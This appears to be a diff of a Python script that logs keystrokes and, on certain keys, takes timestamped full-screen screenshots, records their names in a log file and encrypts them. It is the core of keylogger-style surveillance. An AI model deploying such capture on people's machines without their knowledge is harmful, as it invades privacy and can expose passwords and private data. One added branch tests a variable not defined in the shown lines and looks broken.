@@ -77,6 +77,8 @@ def keystroke(key):
     else :
         if ("Key.cmd" in key) or ("Key.space" in key):
             key = key
+        elif ch == 1:
+            ch = 0
         else:
             # key = key +'\n'
             key = ''
@@ -137,14 +139,14 @@ def keystroke(key):
 def capturekey(k):
     time.sleep(1.2)
     
-    x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
-    x = 'Temp\\Capture\\'+ x + k + '.jpg'
+    ti = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
+    x = 'Temp\\Capture\\'+ ti + k + '.jpg'
 
     with mss() as sct:
         sct.shot(mon=-1, output=x)
 
     with open('Temp/Capture.txt', 'a') as f:
-        f.write(x + '\n')
+        f.write(ti + k + '\n')
 
     # pyautogui.screenshot().save('Temp\\Capture\\'+x)
     encrypt(x)
